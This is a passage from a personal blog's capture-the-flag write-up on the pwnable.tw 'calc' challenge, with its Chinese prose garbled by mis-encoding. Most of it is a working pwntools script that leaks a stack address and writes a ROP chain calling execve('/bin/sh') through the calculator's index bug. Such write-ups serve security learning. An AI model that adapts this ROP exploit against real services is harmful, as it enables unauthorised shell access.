<p>â€‹        çŸ¥é“main_sizeä¹‹åï¼Œå†ç”¨ebp - main_sizeï¼Œå°±æ±‚å‡ºäº†mainå‡½æ•°çš„æ ˆé¡¶ï¼Œæˆ–è€…è¯´calcæ ˆåº•å‘ä¸‹çš„ä¸€ä¸ªå•ä½ï¼Œä¹Ÿå°±æ˜¯num[361]çš„ä½ç½®ã€‚è€Œæˆ‘ä»¬çŸ¥é“binè¯­å¥çš„åœ°å€åœ¨num[368]ï¼Œå› æ­¤ebp - main_size + 4*8å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥â€/bin/shâ€çš„åœ°å€ã€‚</p>
<h3 id="C-Exploit"><a href="#C-Exploit" class="headerlink" title="C . Exploit"></a>C . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">int80_addr = <span class="number">0x08049a21</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx = <span class="number">0x0804848f</span></span><br><span class="line">pop_ecx_pop_ebx = <span class="number">0x080701d1</span></span><br><span class="line">stack = [pop_eax,<span class="number">0xB</span>,pop_edx,<span class="number">0</span>,pop_ecx_pop_ebx,<span class="number">0</span>,<span class="number">0</span>,int80_addr,u32(<span class="string">&quot;/bin&quot;</span>),u32(<span class="string">&quot;/sh\x00&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">i=p.recv()</span><br><span class="line">ebp = <span class="built_in">int</span>(i)+<span class="number">0x100000000</span></span><br><span class="line">esp = (ebp&amp;<span class="number">0xFFFFFFF0</span>)-<span class="number">0x10</span></span><br><span class="line">main_size = ebp - esp + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> main_size</span><br><span class="line">rop_size = <span class="number">4</span>*<span class="number">8</span></span><br><span class="line">stack[<span class="number">6</span>] = <span class="built_in">int</span>(i)-main_size+rop_size</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	index = <span class="number">361</span> + i</span><br><span class="line">	p.sendline(<span class="string">&quot;+&quot;</span>+ <span class="built_in">str</span>(index))</span><br><span class="line">	data = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="keyword">if</span>( stack[i]&gt;data):</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	result = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;num[&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;] : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;halo....&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>â€‹        æœ€åè¿˜å¾—sendlineä¸€ä¸‹æ‰èƒ½getshellã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" style="zoom: 80%;" />
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/07/25/pwnable/" data-id="ckmlis0zb000fs0ljd2vaaz9p" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/08/19/Intermediate%20ROP/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Intermediate ROP
        
      </div>
    </a>
  
  
    <a href="/2020/07/13/2020%205space/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">5space (of-twiceå¤ç°)</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Bin FantasyğŸ¤¯</h1>
    <h2 class="blog-subtitle">You may found nothing here.</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>å‹é“¾</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Ash3n On3<br>
      ç”±<a href="http://hexo.io/" target="_blank">Hexo</a>å¼ºåŠ›é©±åŠ¨ | 
      ä¸»é¢˜-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>è‹Ÿåˆ©</span></li> 
    <li><span>å›½å®¶</span></li> 
    <li><span>ç”Ÿæ­»ä»¥</span></li> 
    <li><span>å²‚èƒ½</span></li> 
    <li><span>ç¥¸ç¦</span></li> 
    <li><span>è¶‹é¿ä¹‹</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>